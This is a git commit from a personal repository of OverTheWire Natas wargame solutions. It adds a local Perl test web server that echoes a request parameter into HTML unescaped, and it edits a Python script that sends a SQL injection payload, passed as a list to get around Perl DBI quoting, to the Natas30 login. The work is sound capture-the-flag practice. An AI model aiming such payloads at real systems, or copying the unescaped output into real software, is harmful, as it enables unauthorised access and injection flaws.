05c449c314dad38dd8ddd70500c36e0bc4b7fe24
Ludisposed <pjgvanschaik@gmail.com>
2017-12-19 14:01:57 +0100

    simple server

---
+++ Natas/Natas30env/simple_server.pl
@@ -0,0 +1,58 @@
+use strict;
+use warnings; 
+ 
+ {
+	 package MyWebServer;	 
+	 use HTTP::Server::Simple::CGI;
+	 use base qw(HTTP::Server::Simple::CGI);
+	 
+	 my %dispatch = (
+	     '/natas30' => \&resp_natas,
+	     '/hello' => \&resp_hello,
+	     # Can add more Paths here
+	 );
+	 
+	 sub handle_request {
+	     my $self = shift;
+	     my $cgi  = shift;
+	   
+	     my $path = $cgi->path_info();
+	     my $handler = $dispatch{$path};
+	 
+	     if (ref($handler) eq "CODE") {
+		 print "HTTP/1.0 200 OK\r\n";
+		 $handler->($cgi);
+		 
+	     } else {
+		 print "HTTP/1.0 404 Not found\r\n";
+		 print $cgi->header,
+		       $cgi->start_html('Not found'),
+		       $cgi->h1('Not found'),
+		       $cgi->end_html;
+	     }
+	 }
+	 sub resp_natas {
+	     my $cgi  = shift;
+	     return if !ref $cgi;
+	     my $who = $cgi->param('name');
+	     print $cgi->header,
+	     $cgi->start_html("Natas30"),
+	     $cgi->h1("Something here $who!"),
+	     $cgi->end_html;
+	 }	 
+	
+	 sub resp_hello {
+	     my $cgi  = shift;
+	     return if !ref $cgi;
+	     
+	     my $who = $cgi->param('name');
+	     
+	     print $cgi->header,
+		   $cgi->start_html("Hello"),
+		   $cgi->h1("Hello $who!"),
+		   $cgi->end_html;
+	 }
+ } 
+ 
+ # start the server on port 9999
+ my $pid = MyWebServer->new(9999)->background();
--- Natas/natas30.py
+++ Natas/natas30.py
@@ -1,23 +1,21 @@
 import requests
-import re
-import string
-
 session = requests.Session()
 
 def natas30(url):
     # I think it needs to be done like this,
     # see https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure
-
     # This should work, but maybe the quoting is done a bit different?
+    # 
     # I do check for the next user (which I know will exist)
-    # And do a SQL injection to let any password work, to test the theory that param is list is the problem
+    # And do a SQL injection to let any password work,
+    # To test the theory that param as list is the problem
     #
     # Any tips?
     
-    params={"username": "natas31", "password": ['lol%22%20OR%20%221%22=%221', 10]}
-    print(params)
+    params={"username": "natas31", "password": ['lol"%20OR%20"1"="1', 10]}
     response = session.post(url, data=params)
-    print(response.text)
+    # print(response.text)
+    # print(params)
     if 'fail' in response.text:
         print("FAILED")
     else:
